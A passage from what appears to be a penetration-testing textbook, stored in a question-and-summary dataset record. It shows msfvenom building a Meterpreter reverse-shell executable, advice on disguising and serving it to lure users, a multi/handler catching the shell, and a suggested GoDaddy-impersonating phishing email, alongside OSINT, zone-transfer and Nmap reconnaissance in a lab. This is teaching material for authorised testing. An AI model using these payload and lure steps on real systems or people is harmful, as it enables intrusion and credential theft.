exe, exe-only, exe-service, exe-small,\nloop-vbs, macho, msi, msi-nouac, psh, psh-net, vba, vba-exe, vbs, war\nTransform formats\nbash, c, csharp, dw, dword, java, js_be, js_le, num, perl, pl, powershell,\npsl, py, python, raw, rb, ruby, sh, vbapplication, vbscript\nTo select the output format, use the -f option along with the chosen\nformat:\nmsfvenom windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=12345 -f exe\n104 Chapter 4\nBut if you run this command as is, you’ll see garbage printed to the\nconsole. While this is technically our executable payload, it doesn’t do us\nmuch good. Instead, let’s redirect the output to an executable file,\nchapter4example.exe. root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=12345 -f exe\n> chapter4example.exe\nroot@kali:~# file chapter4example.exe\nchapter4example.exe: PE32 executable for MS Windows (GUI) Intel 80386 32-bit\nThere is no output to the screen, but if we run the file command on\nour newly created executable file, we see that it’s a Windows executable that\nwill run on any Windows system as long as a user attempts to run it. (Later,\nin Chapter 12, we’ll see cases where antivirus applications stop a Metasploit\npayload and learn ways we can obfuscate our standalone payloads to bypass\nantivirus programs. Also, we will cover clever ways to lure users into down-\nloading and running malicious payloads in Chapter 11.)\nServing Payloads\nOne good way to serve up payloads is to host them on a web server, disguise\nthem as something useful, and lure users into downloading them. For this\nexample, we’ll host our Metasploit executable on our Kali machine’s built-\nin Apache server and browse to the file from our target machine. First, run cp chapter4example.exe /var/www to copy the payload executable\nto the Apache directory, and then make sure the web server is started with\nservice apache2 start. root@kali:~# cp chapter4example.exe /var/www\nroot@kali:~# service apache2 start\nStarting web server apache2 [ OK ]\nNow switch to your Windows XP target and open Internet Explorer. Browse to http://192.168.20.9/chapter4example.exe and download the file. But before we run the file, we have one loose end to deal with. So far when attempting to exploit our target machine, Metasploit set\nup our payload handlers and sent the exploit. When we used Msfconsole to\nexploit the MS08-067 vulnerability with a reverse shell payload, Metasploit\nfirst set up a handler listening on port 4444 for the reverse connection, but\nup to this point we have nothing listening for a reverse connection from the\npayload we created with Msfvenom. Using the Multi/Handler Module\nStart Msfconsole again, and we’ll look at a Metasploit module called multi/\nhandler. This module allows us to set up standalone handlers, which is just\nwhat we’re lacking.\n\nWe need a handler to catch our Meterpreter connection\nwhen our malicious executable is run from the Windows XP target. Select\nthe multi/handler module with use multi/handler. Using the Metasploit Framework 105\nThe first thing to do is tell multi/handler which of Metasploit’s many\nhandlers we need. We need to catch the windows/meterpreter/reverse_tcp\npayload we used when we created our executable with Msfvenom. Choose\nit with set PAYLOAD windows/meterpreter/reverse_tcp, and follow it with show\noptions (Listing 4-16). msf > use multi/handler\nmsf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\nmsf exploit(handler) > show options\nModule options (exploit/multi/handler):\nName Current Setting Required Description\n---- --------------- -------- -----------\nPayload options (windows/meterpreter/reverse_tcp):\nName Current Setting Required Description\n---- --------------- -------- -----------\nEXITFUNC process yes Exit technique: seh, thread, process,\nnone\nLHOST yes The listen address\nLPORT 4444 yes The listen port\n--snip--\nmsf exploit(handler) >\nListing 4-16: Options with multi/handler\nFrom here we tell Metasploit which setup we used when we created the\npayload. We’ll set the LHOST option to our local Kali IP address and the LPORT\nto the port we chose in Msfvenom, in this case 192.168.20.9 and 12345,\nrespectively. Once all the options for the payload are set correctly, enter\nexploit, as shown in Listing 4-17. msf exploit(handler) > set LHOST 192.168.20.9\nLHOST => 192.168.20.9\nmsf exploit(handler) > set LPORT 12345\nLPORT => 12345\nmsf exploit(handler) > exploit\n[*] Started reverse handler on 192.168.20.9:12345\n[*] Starting the payload handler... Listing 4-17: Setting up a handler\nAs you can see, Metasploit sets up a reverse handler on port 12345 as\ninstructed, listening for a payload to call back. 106 Chapter 4\nNow we can switch back to our Windows XP target and run our down-\nloaded executable. Run chapter4example.exe on your Windows target. Back\nin Msfconsole, you should see that the handler receives the reverse connec-\ntion, and you receive a Meterpreter session. [*] Sending stage (752128 bytes) to 192.168.20.10\n[*] Meterpreter session 1 opened (192.168.20.9:12345 -> 192.168.20.10:49437)\nat 2015-09-01 11:20:00 -0400\nmeterpreter >\nSpend some time experimenting with Msfvenom if you like. We’ll\nreturn to this useful tool when we attempt to bypass antivirus solutions\nin Chapter 12. using an auxiliary module\nMetasploit was first conceived as an exploitation framework, and it contin-\nues to be a top contender in the world of exploitation. But in the ensuing\nyears, its functionality has grown in about as many directions as there are\ncreative minds working on it. I sometimes quip that Metasploit can do every-\nthing except my laundry, and I’m currently working on a module for that. Dirty socks aside, in addition to exploitation, Metasploit has modules\nto aid in every phase of pentesting. Some modules that are not used for\nexploitation are known as auxiliary modules; they include things like vulner-\nability scanners, fuzzers, and even denial of service modules. (A good rule\nof thumb to remember is that exploit modules use a payload and auxiliary\nmodules do not.)\nFor example, when we first used the windows/smb/ms08_067_netapi\nexploit module earlier in this chapter, one of its options was SMBPIPE. The\ndefault value for that option was BROWSER. Let’s look at an auxiliary module\nthat will enumerate the listening pipes on an SMB server, auxiliary/scanner/\nsmb/pipe_auditor (Listing 4-18). (We use auxiliary modules like exploits, and\nlike exploits we can also drop the auxiliary/ part of the module name.)\nmsf > use scanner/smb/pipe_auditor\nmsf auxiliary(pipe_auditor) > show options\nModule options (auxiliary/scanner/smb/pipe_auditor):\nName Current Setting Required Description\n---- --------------- -------- -----------\nuRHOSTS yes The target address range or CIDR identifier\nSMBDomain WORKGROUP no The Windows domain to use for authentication\nSMBPass no The password for the specified username\nSMBUser no The username to authenticate as\nTHREADS 1 yes The number of concurrent threads\nListing 4-18: Options for scanner/smb/pipe_auditor\nUsing the Metasploit Framework 107\nThe options for this module are a bit different from what we’ve seen so\nfar. Instead of RHOST we have RHOSTS u, which allows us to specify more than\none remote host to run the module against. (Auxiliaries can be run against\nmultiple hosts, whereas exploits can exploit only one system at a time.)\nWe also see options for SMBUser, SMBPass, and SMBDomain. Because our\nWindows XP target is not part of any domain, we can leave the SMBDomain\nat the default value, WORKGROUP. We can leave the SMBUser and SMBPass values\nblank. The THREADS option allows us to control the speed of Metasploit by\nhaving our module run in multiple threads. We’re scanning only one sys-\ntem in this case, so the default value of 1 thread will work fine. The only\noption we need to set is RHOSTS to the IP address of our Windows XP target. msf auxiliary(pipe_auditor) > set RHOSTS 192.168.20.10\nRHOSTS => 192.168.20.10\nEven though we aren’t technically exploiting anything in this case, we\ncan still tell Metasploit to run our auxiliary module by entering exploit. msf auxiliary(pipe_auditor) > exploit\n[*] 192.168.20.10 - Pipes: \\browser u\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(pipe_auditor) >\nThe module audits the listening SMB pipes on our Windows XP tar-\nget. As it turns out, the browser pipe is the only available pipe u. Because\nthis pipe is listening, this is the correct value for the SMBPIPE option in\nthe windows/smb/ms08_067_netapi exploit module we used earlier in the\nchapter. uPDating metasPloit\nThe exercises in this book are designed to work on a base install of Kali\nLinux 1 .0 .6 . Naturally, many security tools used in this book will have been\nupdated since Kali’s release . Metasploit in particular receives regular updates\nfrom core developers as well as from the security community . All of the material in this book works with the Metasploit version installed\non Kali 1 .0 .6 . As you continue your career as a pentester, you’ll want the latest\nMetasploit modules . The Metasploit Project is typically pretty solid at releasing\nmodules for the latest security issues circulating the Web . To pull down the lat-\nest modules from Metasploit’s GitHub, enter the following:\nroot@kali:~# msfupdate\n108 Chapter 4\nsummary\nIn this chapter we’ve gotten comfortable using some of Metasploit’s inter-\nfaces. We’ll return to Metasploit throughout the book. In the next few chapters we’ll simulate a penetration test against our\ntarget machines, covering a wide variety of vulnerability types. If you pur-\nsue a career in penetration testing, you will likely encounter clients span-\nning the gamut of possible security postures. Some will be missing so many\npatches across the organization that you may wonder if they have updated\nsince installing the base image back in 2001. Along with missing patches,\nyou may find additional vulnerabilities such as default passwords and mis-\nconfigured services. Gaining access to such networks is trivial for skilled\npenetration testers. On the other hand, you may also find yourself working for clients who\nhave patch management down pat, with everything from Windows operat-\ning systems to all third-party software on a regular patch cycle across the\norganization. Some clients may deploy cutting-edge security controls such\nas proxies that allow only Internet Explorer to call out to the Internet. This\nwill stop even Metasploit reverse shells that call back on ports 80 or 443 and\nlook like web traffic, unless you are able to exploit the Internet Explorer\nprogram, which may also be completely patched. You may find intrusion\nprevention firewalls at the perimeter that drop any string that looks even\na little bit like attack traffic. Simply throwing the MS08-067 Metasploit module at these high-\nsecurity networks will get you no results, except maybe a call from a net-\nwork monitoring vendor with a warrant for your arrest. (Don’t worry: As\npart of the penetration test, you will have a get-out-of-jail-free card.) But\neven highly secure networks are only as strong as their weakest link. For\ninstance, I once performed an onsite penetration test for a company that\nemployed all of the security controls I just mentioned. However, the local\nadministrator password on all the Windows workstations was the same five-\nletter dictionary word. After I cracked the password, I was able to log on as\nan administrator on every workstation on the network. From there I was\nable to use something called token impersonation to gain domain administra-\ntor access. Despite all the strong security controls, with a little effort I was\nable to take over the network the same way I would a network with missing\npatches from 2003. As you work through the rest of this book, you will pick up not only the\ntechnical skills required to break into vulnerable systems but also the mind-\nset required to find a way in when none seems readily apparent. Now let’s turn our attention to gathering information about our targets\nso we can develop a solid plan of attack. Using the Metasploit Framework 109\nPaRT II\nassessments\n5\ninformation g atHering\nIn this chapter we begin the information-gathering\nphase of penetration testing. The goal of this phase\nis to learn as much about our clients as we can. Does\nthe CEO reveal way too much on Twitter? Is the sys-\ntem administrator writing to archived listservs, asking\nabout how to secure a Drupal install? What software\nare their web servers running? Are the Internet-facing systems listening\non more ports than they should? Or, if this is an internal penetration test,\nwhat is the IP address of the domain controller? We’ll also start to interact with our target systems, learning as much as\nwe can about them without actively attacking them. We’ll use the knowledge\ngained in this phase to move on to the threat-modeling phase where we\nthink like attackers and develop plans of attack based on the information\nwe’ve gathered. Based on the information we uncover, we’ll actively search\nfor and verify vulnerabilities using vulnerability-scanning techniques, which\nare covered in the next chapter. open source intelligence gathering\nWe can learn a good deal about our client’s organization and infrastructure\nbefore we send a single packet their way, but information gathering can still\nbe a bit of a moving target. It isn’t feasible to study the online life of every\nemployee, and given a large amount of gathered information, it can be dif-\nficult to discern important data from noise. If the CEO tweets frequently\nabout a favorite sports team, that team’s name may be the basis for her\nwebmail password, but it could just as easily be entirely irrelevant. Other\ntimes it will be easier to pick up on something crucial. For instance, if your\nclient has online job postings for a system administrator who is an expert\nin certain software, chances are those platforms are deployed in the client’s\ninfrastructure. As opposed to intelligence gained from covert sources such as dump-\nster diving, dumping website databases, and social engineering, open source\nintelligence (or OSINT) is gathered from legal sources like public records\nand social media. The success of a pentest often depends on the results of\nthe information-gathering phase, so in this section, we will look at a few\ntools to obtain interesting information from these public sources. Netcraft\nSometimes the information that web servers and web-hosting companies\ngather and make publicly available can tell you a lot about a website. For\ninstance, a company called Netcraft logs the uptime and makes queries\nabout the underlying software. (This information is made publicly available\nat http://www.netcraft.com/.) Netcraft also provides other services, and their\nantiphishing offerings are of particular interest to information security. For example, Figure 5-1 shows the result when we query http://www\n.netcraft.com/ for http://www.bulbsecurity.com. As you can see, bulbsecurity.com\nwas first seen in March 2012. It was registered through GoDaddy, has an IP\naddress of 50.63.212.1, and is running Linux with an Apache web server.",
    "question": "What is the process for selecting and configuring a payload in the Metasploit Framework when exploiting a Windows system?",
    "summary": "This chapter covers using the Metasploit Framework for penetration testing, including setting up exploit modules, choosing payloads, and using tools like Msfvenom to create standalone payloads. It also explains how to use auxiliary modules for tasks like enumerating SMB pipes and how to update Metasploit to ensure compatibility with the latest security issues. The chapter emphasizes the importance of information gathering before attacking a system, using open source intelligence (OSINT) techniques to learn about the target organization and infrastructure."
  },
  {
    "start": 33,
    "end": 49,
    "text": "Armed with this information, when pentesting bulbsecurity.com, we could\nstart by ruling out vulnerabilities that affect only Microsoft IIS servers. Or,\nif we wanted to try social engineering to get credentials to the website, we\ncould write an email that appears to be from GoDaddy, asking the adminis-\ntrator to log in and check some security settings. 114 Chapter 5\nFigure 5-1: Netcraft’s results for bulbsecurity .com\nWhois Lookups\nAll domain registrars keep records of the domains they host. These records\ncontain information about the owner, including contact information. For\nexample, if we run the Whois command line tool on our Kali machine to\nquery for information about bulbsecurity.com, as shown in Listing 5-1, we see\nthat I used private registration, so we won’t learn much. root@kali:~# whois bulbsecurity.com\nRegistered through: GoDaddy.com, LLC (http://www.godaddy.com)\nDomain Name: BULBSECURITY.COM\nCreated on: 21-Dec-11\nExpires on: 21-Dec-12\nLast Updated on: 21-Dec-11\nRegistrant: u\nDomains By Proxy, LLC\nDomainsByProxy.com\n14747 N Northsight Blvd Suite 111, PMB 309\nScottsdale, Arizona 85260\nUnited States\nInformation Gathering 115\nTechnical Contact: v\nPrivate, Registration BULBSECURITY.COM@domainsbyproxy.com\nDomains By Proxy, LLC\nDomainsByProxy.com\n14747 N Northsight Blvd Suite 111, PMB 309\nScottsdale, Arizona 85260\nUnited States\n(480) 624-2599 Fax -- (480) 624-2598\nDomain servers in listed order:\nNS65.DOMAINCONTROL.COM w\n\nNS66.DOMAINCONTROL.COM\nListing 5-1: Whois information for bulbsecurity .com\nThis site has private registration, so both the registrant u and technical\ncontact v are domains by proxy. Domains by proxy offer private registra-\ntion, hiding your personal details in the Whois information for the domains\nyou own. However, we do see the domain servers w for bulbsecurity.com.\nRunning Whois queries against other domains will show more interesting\nresults. For example, if you do a Whois lookup on georgiaweidman.com, you\nmight get an interesting blast from the past, including my college phone\nnumber.\nDNS Reconnaissance\nWe can also use Domain Name System (DNS) servers to learn more about a\ndomain. DNS servers translate the human-readable URL www.bulbsecurity.com\ninto an IP address.\nNslookup\nFor example, we could use a command line tool such as Nslookup, as shown\nin Listing 5-2.\nroot@Kali:~# nslookup www.bulbsecurity.com\nServer: 75.75.75.75\nAddress: 75.75.75.75#53\nNon-authoritative answer:\nwww.bulbsecurity.com canonical name = bulbsecurity.com.\nName: bulbsecurity.com\nAddress: 50.63.212.1 u\nListing 5-2: Nslookup information for www .bulbsecurity .com\nNslookup returned the IP address of www.bulbsecurity.com, as you can\nsee at u.\nWe can also tell Nslookup to find the mail servers for the same website\nby looking for MX records (DNS speak for email), as shown in Listing 5-3.\n116 Chapter 5\nroot@kali:~# nslookup\n> set type=mx\n> bulbsecurity.com\nServer: 75.75.75.75\nAddress: 75.75.75.75#53\nNon-authoritative answer:\nbulbsecurity.com mail exchanger = 40 ASPMX2.GOOGLEMAIL.com.\nbulbsecurity.com mail exchanger = 20 ALT1.ASPMX.L.GOOGLE.com.\nbulbsecurity.com mail exchanger = 50 ASPMX3.GOOGLEMAIL.com.\nbulbsecurity.com mail exchanger = 30 ALT2.ASPMX.L.GOOGLE.com.\nbulbsecurity.com mail exchanger = 10 ASPMX.L.GOOGLE.com.\nListing 5-3: Nslookup information for bulbsecurity .com’s mail servers\nNslookup says bulbsecurity.com is using Google Mail for its email servers,\nwhich is correct because I use Google Apps.\nHost\nAnother utility for DNS queries is Host. We can ask Host for the name\nservers for a domain with the command host -t ns domain. A good example\nfor domain queries is zoneedit.com, a domain set up to demonstrate zone\ntransfer vulnerabilities, as shown here.\nroot@kali:~# host -t ns zoneedit.com\nzoneedit.com name server ns4.zoneedit.com.\nzoneedit.com name server ns3.zoneedit.com.\n--snip--\nThis output shows us all the DNS servers for zoneedit.com. Naturally,\nbecause I mentioned that this domain was set up to demonstrate zone\ntransfers, that’s what we are going to do next.\nZone Transfers\nDNS zone transfers allow name servers to replicate all the entries about a\ndomain. When setting up DNS servers, you typically have a primary name\nserver and a backup server. What better way to populate all the entries in\nthe secondary DNS server than to query the primary server for all of its\nentries?\nUnfortunately, many system administrators set up DNS zone transfers\ninsecurely, so that anyone can transfer the DNS records for a domain.\nzoneedit.com is an example of such a domain, and we can use the host com-\nmand to download all of its DNS records. Use the -l option to specify the\ndomain to transfer, and choose one of the name servers from the previous\ncommand, as shown in Listing 5-4.\nInformation Gathering 117\nroot@kali:~# host -l zoneedit.com ns2.zoneedit.com\nUsing domain server:\nName: ns2.zoneedit.com\nAddress: 69.72.158.226#53\nAliases:\nzoneedit.com name server ns4.zoneedit.com.\nzoneedit.com name server ns3.zoneedit.com.\nzoneedit.com name server ns15.zoneedit.com.\nzoneedit.com name server ns8.zoneedit.com.\nzoneedit.com name server ns2.zoneedit.com.\nzoneedit.com has address 64.85.73.107\nwww1.zoneedit.com has address 64.85.73.41\ndynamic.zoneedit.com has address 64.85.73.112\nbounce.zoneedit.com has address 64.85.73.100\n--snip--\nmail2.zoneedit.com has address 67.15.232.182\n--snip--\nListing 5-4: Zone transfer of zoneedit .com\nThere are pages and pages of DNS entries for zoneedit.com, which gives\nus a good idea of where to start in looking for vulnerabilities for our pen-\ntest. For example, mail2.zoneedit.com is probably a mail server, so we should\nlook for potentially vulnerable software running on typical email ports such\nas 25 (Simple Mail Transfer Protocol) and 110 (POP3). If we can find a web-\nmail server, any usernames we find may lead us in the right direction so that\nwe can guess passwords and gain access to sensitive company emails.\nSearching for Email Addresses\nExternal penetration tests often find fewer services exposed than internal\nones do. A good security practice is to expose only those services that must\nbe accessed remotely, like web servers, mail servers, VPN servers, and maybe\nSSH or FTP, and only those services that are mission critical. Services like\nthese are common attack surfaces, and unless employees use two-factor\nauthentication, accessing company webmail can be simple if an attacker\ncan guess valid credentials.\nOne excellent way to find usernames is by looking for email addresses\non the Internet. You might be surprised to find corporate email addresses\npublicly listed on parent-teacher association contact info, sports team ros-\nters, and, of course, social media.\nYou can use a Python tool called theHarvester to quickly scour thou-\nsands of search engine results for possible email addresses. theHarvester\ncan automate searching Google, Bing, PGP, LinkedIn, and others for email\naddresses. For example, in Listing 5-5, we’ll look at the first 500 results in\nall search engines for bulbsecurity.com.\n118 Chapter 5\nroot@kali:~# theharvester -d bulbsecurity.com -l 500 -b all\n*******************************************************************\n* *\n* | |_| |__ ___ /\\ /\\__ _ _ ____ _____ ___| |_ ___ _ __ *\n* | __| '_ \\ / _ \\ / /_/ / _` | '__\\ \\ / / _ \\/ __| __/ _ \\ '__| *\n* | |_| | | | __/ / __ / (_| | | \\ V / __/\\__ \\ || __/ | *\n* \\__|_| |_|\\___| \\/ /_/ \\__,_|_| \\_/ \\___||___/\\__\\___|_| *\n* *\n* TheHarvester Ver. 2.2a *\n* Coded by Christian Martorella *\n* Edge-Security Research *\n* cmartorella@edge-security.com *\n*******************************************************************\nFull harvest..\n[-] Searching in Google..\nSearching 0 results...\nSearching 100 results...\nSearching 200 results...\nSearching 300 results...\n--snip--\n[+] Emails found:\n------------------\ngeorgia@bulbsecurity.com\n[+] Hosts found in search engines:\n------------------------------------\n\n50.63.212.1:www.bulbsecurity.com\n--snip--\nListing 5-5: Running theHarvester against bulbsecurity .com\nThere’s not too much to be found for bulbsecurity.com, but theHarvester\ndoes find my email address, georgia@bulbsecurity.com, and the website,\nwww.bulbsecurity.com, as well as other websites I share virtual hosting\nwith. You may find more results if you run theHarvester against your\norganization.\nMaltego\nPaterva’s Maltego is a data-mining tool designed to visualize open source\nintelligence gathering. Maltego has both a commercial and a free com-\nmunity edition. The free Kali Linux version, which we’ll use in this book,\nlimits the results it returns, but we can still use it to gather a good deal of\ninteresting information very quickly. (The paid version offers more results\nand functionality. To use Maltego on your pentests, you will need a paid\nlicense.)\nInformation Gathering 119\nnote Feel free to use Maltego to study other Internet footprints, including your own, your\ncompany’s, your high school arch nemesis’s, and so on. Maltego uses information\npublicly available on the Internet, so it is perfectly legal to do reconnaissance on any\nentity.\nTo run Maltego, enter maltego at the command line. The Maltego GUI\nshould launch. You will be prompted to create a free account at the Paterva\nwebsite and log in. Once logged in, choose Open a blank graph and let me\nplay around, and then click Finish, as shown in Figure 5-2.\nFigure 5-2: Opening a new Maltego graph\nNow select the Palette option from the left-hand border. As you can see,\nwe can gather information about all sorts of entities.\nLet’s start with the bulbsecurity.com domain, as shown in Figure 5-3.\nExpand the Infrastructure option from the Palette (on the left of the\nMaltego window) and drag a Domain entity from the Palette onto the new\ngraph. By default, the domain is paterva.com. To change it to bulbsecurity.com,\neither double-click the text or change the text field at the right side of the\nscreen.\n120 Chapter 5\nFigure 5-3: Adding an entity to the graph\nOnce the domain is set, you can run transforms (Maltego-speak for\nqueries) on it, instructing Maltego to search for interesting information.\nLet’s start with a couple of simple transforms, which you can view by right-\nclicking the domain icon and choosing Run Transform, as shown in\nFigure 5-4.\nIn the figure, we can see all the transforms available for a domain entity.\nAs you work with different entities, different transform options will be avail-\nable. Let’s find the MX records for the bulbsecurity.com domain and, thus,\nwhere the mail servers are. Under All Transforms, choose the To DNS\nName – MX (mail server) transform.\nAs expected from our previous research, Maltego returns Google Mail\nservers, indicating that bulbsecurity.com uses Google Apps for email. We can\nrun the simple To Website [Quick lookup] transform to get the website\naddress of bulbsecurity.com. See Figure 5-5 for the results from both this and\nthe previous transform.\nInformation Gathering 121\nFigure 5-4: Maltego transforms\nFigure 5-5: Transform results\n122 Chapter 5\nMaltego correctly finds www.bulbsecurity.com. Attacking the Google\nMail servers will likely be out of the scope of any pentest, but more infor-\nmation on the www.bulbsecurity.com website would certainly be useful.\nWe can run transforms on any entity on the graph, so select the website\nwww.bulbsecurity.com to gather data on it. For instance, we can run the trans-\nform ToServerTechnologiesWebsite to see what software www.bulbsecurity.com\nis running, as shown in Figure 5-6.\nFigure 5-6: www .bulbsecurity .com software\nMaltego finds that www.bulbsecurity.com is an Apache web server with\nPHP, Flash, and so on, along with a WordPress install. WordPress, a com-\nmonly used blogging platform, has a long history of security issues (like\na lot of software). We’ll look at exploiting website vulnerabilities in Chap-\nter 14. (Let’s hope I am keeping my WordPress blog up to date, or else I\nmight wake up to find my site defaced one day. How embarrassing!)\nYou can find additional information and tutorials about Maltego at\nhttp://www.paterva.com/. Spend some time using Maltego transforms to find\ninteresting information about your organization. In skilled hands, Maltego\ncan turn hours of reconnaissance work into minutes with the same quality\nresults.\nPort scanning\nWhen you start a pentest, the potential scope is practically limitless. The\nclient could be running any number of programs with security issues: They\ncould have misconfiguration issues in their infrastructure that could lead to\ncompromise; weak or default passwords could give up the keys to the king-\ndom on otherwise secure systems; and so on. Pentests often narrow your\nInformation Gathering 123\nscope to a particular IP range and nothing more, and you won’t help your\nclient by developing a working exploit for the latest and greatest server-side\nvulnerability if they don’t use the vulnerable software. We need to find out\nwhich systems are active and which software we can talk to.\nManual Port Scanning\nFor example, in the previous chapter we saw that exploiting the MS08-\n067 vulnerability can be an easy win for attackers and pentesters alike. To\nuse this exploit, we need to find a Windows 2000, XP, or 2003 box with an\nSMB server that is missing the MS08-067 Microsoft patch available on the\nnetwork. We can get a good idea about the network-based attack surface by\nmapping the network range and querying systems for listening ports.\nWe can do this manually by connecting to ports with a tool such as\ntelnet or Netcat and recording the results. Let’s use Netcat to connect to\nthe Windows XP machine on port 25, the default port for the Simple Mail\nTransfer Protocol (SMTP).\nroot@kali:~# nc -vv 192.168.20.10 25\nnc: 192.168.20.10 (192.168.20.10) 25 [smtp]u open\nnc: using stream socket\nnc: using buffer size 8192\nnc: read 66 bytes from remote\n220 bookxp SMTP Server SLmail 5.5.0.4433 Ready\nESMTP spoken here\nnc: wrote 66 bytes to local\nAs it turns out, the Windows XP box is running an SMTP server\non port 25 u. After we connected, the SMTP server announced itself\nas SLMail version 5.5.0.4433.\nNow, keep in mind that admins can change banners like this to say\nanything, even sending attackers and pentesters on a wild goose chase,\nstudying vulnerabilities for a product that is not deployed. In most cases,\nhowever, versions in software banners will be fairly accurate, and just con-\nnecting to the port and viewing the banner provides a starting point for\nour pentesting research. Searching the Web for information about SLMail\nversion 5.5.0.4433 may yield some interesting results.\nOn the other hand, connecting to every possible TCP and UDP port on\njust one machine and noting the results can be time consuming. Luckily,\ncomputers are excellent at repetitive tasks like this, and we can use port-\nscanning tools such as Nmap to find listening ports for us.\nnote Everything we have done so far in this chapter is completely legal. But once we start\nactively querying systems, we are moving into murky legal territory. Attempting to break\ninto computers without permission is, of course, illegal in many countries. Though\nstealthy scan traffic may go unnoticed, you should practice the skills we study in the\nrest of this chapter (and the rest of this book) only on your target virtual machines or\nother systems you own or have written permission to test (known in the trade as a\nget-out-of-jail-free card).\n124 Chapter 5\nPort Scanning with Nmap\nNmap is an industry standard for port scanning. Entire books have been\nwritten just about using Nmap, and the manual page may seem a bit daunt-\ning. We will cover the basics of port scanning here and come back to the\ntool in later chapters.\nFirewalls with intrusion-detection and prevention systems have made\ngreat strides in detecting and blocking scan traffic, so you might run an\nNmap scan and receive no results at all. Though you could be hired to per-\nform an external pentest against a network range with no live hosts, it’s more\nlikely that you’re being blocked by a firewall. On the other hand, your Nmap\nresults might instead say that every host is alive, and will be listening on every\nport if your scan is detected.\na SYN Scan\nLet’s start by running a SYN scan against our target machines. A SYN scan\nis a TCP scan that does not finish the TCP handshake. A TCP connection\nstarts with a three-way handshake: SYN 4 SYN-ACK 4 ACK, as shown in\nFigure 5-7.\nSYN\n\nSYN-ACK\nACK\nFigure 5-7: TCP three-way handshake\nIn a SYN scan, Nmap sends the SYN and waits for the SYN-ACK if the\nport is open but never sends the ACK to complete the connection. If the\nSYN packet receives no SYN-ACK response, the port is not available; either\nit’s closed or the connection is being filtered. This way, Nmap finds out if a\nport is open without ever fully connecting to the target machine. The syn-\ntax for a SYN scan is the -sS flag.\nNext, as you can see in Listing 5-6, we specify the IP address(s) or range\nto scan. Finally, we use the -o option to output our Nmap results to a file. The\n-oA option tells Nmap to log our results in all formats: .nmap, .gnmap (grep-\npable Nmap), and XML. Nmap format, like the output that Nmap prints\nto the screen in Listing 5-6, is nicely formatted and easy to read. Greppable\nNmap (as the name implies) is formatted to be used with the grep utility to\nsearch for specific information. XML format is a standard used to import\nNmap results into other tools. Listing 5-6 shows the results of the SYN scan.\nnote It is always a good idea to take good notes of everything we do on our pentest.\nTools such as Dradis are designed specifically to track pentest data, but as long\nas you have notes of everything you did when you get to the reporting phase,\nyou will be okay. I personally am more of a pen-and-paper user, or at best, a\nInformation Gathering 125\ncreating-a-long-Word-document-with-all-of-my-results type. The methods used for track-\ning results vary from pentester to pentester. Outputting your Nmap results to files is a\ngood way to make sure you have a record of your scan. Also, you can use the Linux\ncommand script to record everything printed to your terminal—another good way to\nkeep track of everything you have done.\nroot@kali:~# nmap -sS 192.168.20.10-12 -oA booknmap\nStarting Nmap 6.40 ( http://nmap.org ) at 2015-12-18 07:28 EST\nNmap scan report for 192.168.20.10\nHost is up (0.00056s latency).\nNot shown: 991 closed ports\n\nPORT STATE SERVICE\n21/tcp open ftp v\n25/tcp open smtp y\n80/tcp open http w\n106/tcp open pop3pw y\n110/tcp open pop3 y\n135/tcp open msrpc\n139/tcp open netbios-ssn x\n443/tcp open https w\n445/tcp open microsoft-ds x\n1025/tcp open NFS-or-IIS\n3306/tcp open mysql z\n5000/tcp open upnp\nMAC Address: 00:0C:29:A5:C1:24 (VMware)\nNmap scan report for 192.168.20.11\nHost is up (0.00031s latency).\nNot shown: 993 closed ports\n\nPORT STATE SERVICE\n21/tcp open ftp v\n22/tcp open ssh\n80/tcp open http w\n111/tcp open rpcbind\n139/tcp open netbios-ssn x\n445/tcp open microsoft-ds x\n2049/tcp open nfs\nMAC Address: 00:0C:29:FD:0E:40 (VMware)\nNmap scan report for 192.168.20.12\nHost is up (0.0014s latency).\nNot shown: 999 filtered ports\n\nPORT STATE SERVICE\n80/tcp open http u\n135/tcp open msrpc\nMAC Address: 00:0C:29:62:D5:C8 (VMware)\nNmap done: 3 IP addresses (3 hosts up) scanned in 1070.40 seconds\nListing 5-6: Running an Nmap SYN scan\n126 Chapter 5\nAs you can see, Nmap returns a handful of ports on the Windows XP\nand Linux boxes. We will see as we move through the next few chapters that\nnearly all of these ports contain vulnerabilities. Hopefully, that won’t be the\ncase on your pentests, but in an attempt to introduce you to many types of\nvulnerabilities you will encounter in the field, our pentesting lab has been\ncondensed into these three machines.\nThat said, just because a port is open does not mean that vulnerabilities\nare present. Rather it leaves us with the possibility that vulnerable software\nmight be running on these ports. Our Windows 7 machine is listening only\non port 80 u, the traditional port for HTTP web servers, and port 139\nfor remote procedure call. There may be exploitable software listening\non ports that are not allowed through the Windows firewall, and there\nmay be vulnerable software running locally on the machine, but at the\nmoment we can’t attempt to exploit anything directly over the network\nexcept the web server.\nThis basic Nmap scan has already helped us focus our pentesting efforts.\nBoth the Windows XP and Linux targets are running FTP servers v, web\nservers w, and SMB servers x. The Windows XP machine is also running a\nmail server that has opened several ports y and a MySQL server z.\na Version Scan\nOur SYN scan was stealthy, but it didn’t tell us much about the software that\nis actually running on the listening ports. Compared to the detailed version\ninformation we got by connecting to port 25 with Netcat, the SYN scan’s\nresults are a bit lackluster. We can use a full TCP scan (nmap -sT) or go a\nstep further and use Nmap’s version scan (nmap -sV) to get more data. With\nthe version scan shown in Listing 5-7, Nmap completes the connection and\nthen attempts to determine what software is running and, if possible, the\nversion, using techniques such as banner grabbing.\nroot@kali:~# nmap -sV 192.168.20.10-12 -oA bookversionnmap\nStarting Nmap 6.40 ( http://nmap.org ) at 2015-12-18 08:29 EST\nNmap scan report for 192.168.20.10\nHost is up (0.00046s latency).\nNot shown: 991 closed ports\n\nPORT STATE SERVICE VERSION\n21/tcp open ftp FileZilla ftpd 0.9.32 beta\n25/tcp open smtp SLmail smtpd 5.5.0.4433\n79/tcp open finger SLMail fingerd\n80/tcp open http Apache httpd 2.2.12 ((Win32) DAV/2 mod_ssl/2.2.12 OpenSSL/0.9.8k\nmod_autoindex_color PHP/5.3.0 mod_perl/2.0.4 Perl/v5.10.0)\n106/tcp open pop3pw SLMail pop3pw\n110/tcp open pop3 BVRP Software SLMAIL pop3d\n135/tcp open msrpc Microsoft Windows RPC\n139/tcp open netbios-ssn\n443/tcp open ssl/http Apache httpd 2.2.12 ((Win32) DAV/2 mod_ssl/2.2.12 